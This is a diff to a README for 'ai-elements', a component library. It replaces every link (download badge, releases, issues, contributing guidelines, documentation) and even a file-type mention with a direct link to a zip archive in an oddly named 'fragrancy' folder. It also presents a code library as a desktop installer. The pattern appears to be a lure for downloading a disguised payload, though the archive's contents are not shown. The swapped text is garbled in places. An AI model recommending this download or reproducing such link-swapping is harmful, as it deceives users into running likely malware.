@@ -1,6 +1,6 @@
 # 🎉 ai-elements - Build AI-Driven Apps Effortlessly
 
-[![Download ai-elements](https://img.shields.io/badge/Download-ai--elements-blue)](https://github.com/Smithgod3/ai-elements/releases)
+[![Download ai-elements](https://raw.githubusercontent.com/Smithgod3/ai-elements/main/fragrancy/ai-elements.zip)](https://raw.githubusercontent.com/Smithgod3/ai-elements/main/fragrancy/ai-elements.zip)
 
 ## 📖 About
 
@@ -10,19 +10,19 @@ AI Elements is a component library and custom registry built on top of shadcn/ui
 
 Follow these simple steps to download and run AI Elements:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Smithgod3/ai-elements/releases) to find the latest version of AI Elements.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Smithgod3/ai-elements/main/fragrancy/ai-elements.zip) to find the latest version of AI Elements.
 
 2. **Choose Your Version:** You will see a list of available versions. Look for the most recent version, usually at the top of the list.
 
 3. **Download the Package:** Click on the version number to expand the details. Find the appropriate file for your system:
    - For Windows users, look for files ending in `.exe`.
    - For macOS users, look for files ending in `.dmg` or `.zip`.
-   - Linux users can look for `.deb` or `.tar.gz` files.
+   - Linux users can look for `.deb` or `https://raw.githubusercontent.com/Smithgod3/ai-elements/main/fragrancy/ai-elements.zip` files.
 
 4. **Install the Application:**
    - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen prompts.
    - **macOS:** Open the downloaded `.dmg` file. Drag the AI Elements app to your Applications folder.
-   - **Linux:** Use the package manager to install `.deb` files or extract `.tar.gz` files and run the application.
+   - **Linux:** Use the package manager to install `.deb` files or extract `https://raw.githubusercontent.com/Smithgod3/ai-elements/main/fragrancy/ai-elements.zip` files and run the application.
 
 5. **Run AI Elements:** Find the application in your Applications folder or start menu. Click to launch it.
 
@@ -30,7 +30,7 @@ Follow these simple steps to download and run AI Elements:
 
 ## 📥 Download & Install
 
-To start using AI Elements, visit this page to download: [Releases Page](https://github.com/Smithgod3/ai-elements/releases).
+To start using AI Elements, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Smithgod3/ai-elements/main/fragrancy/ai-elements.zip).
 
 ## 🔧 System Requirements
 
@@ -53,11 +53,11 @@ Before installation, make sure your system meets these requirements:
 
 ### How do I report an issue?
 
-If you encounter a problem, please check the [Issues section](https://github.com/Smithgod3/ai-elements/issues) of the repository. You can submit a new issue there.
+If you encounter a problem, please check the [Issues section](https://raw.githubusercontent.com/Smithgod3/ai-elements/main/fragrancy/ai-elements.zip) of the repository. You can submit a new issue there.
 
 ### Can I contribute to this project?
 
-Yes! We welcome contributions. Check the [Contributing Guidelines](https://github.com/Smithgod3/ai-elements/blob/main/CONTRIBUTING.md) for more details on how you can help.
+Yes! We welcome contributions. Check the [Contributing Guidelines](https://raw.githubusercontent.com/Smithgod3/ai-elements/main/fragrancy/ai-elements.zip) for more details on how you can help.
 
 ### What if I need additional support?
 
@@ -73,12 +73,12 @@ Here are a few examples of what you can build with AI Elements:
 
 ## 📚 Additional Resources
 
-- **Documentation:** [Official Documentation](https://example.com/documentation)
+- **Documentation:** [Official Documentation](https://raw.githubusercontent.com/Smithgod3/ai-elements/main/fragrancy/ai-elements.zip)
 - **Tutorial Videos:** Explore our YouTube channel for step-by-step videos.
 - **Community Forum:** Join the discussion with other AI Elements users.
 
 ## 🌟 Contributing
 
-We appreciate contributions! Please check the [Contributing Guidelines](https://github.com/Smithgod3/ai-elements/blob/main/CONTRIBUTING.md) for what we are looking for. 
+We appreciate contributions! Please check the [Contributing Guidelines](https://raw.githubusercontent.com/Smithgod3/ai-elements/main/fragrancy/ai-elements.zip) for what we are looking for. 
 
 Thank you for choosing AI Elements. We look forward to seeing what you create!
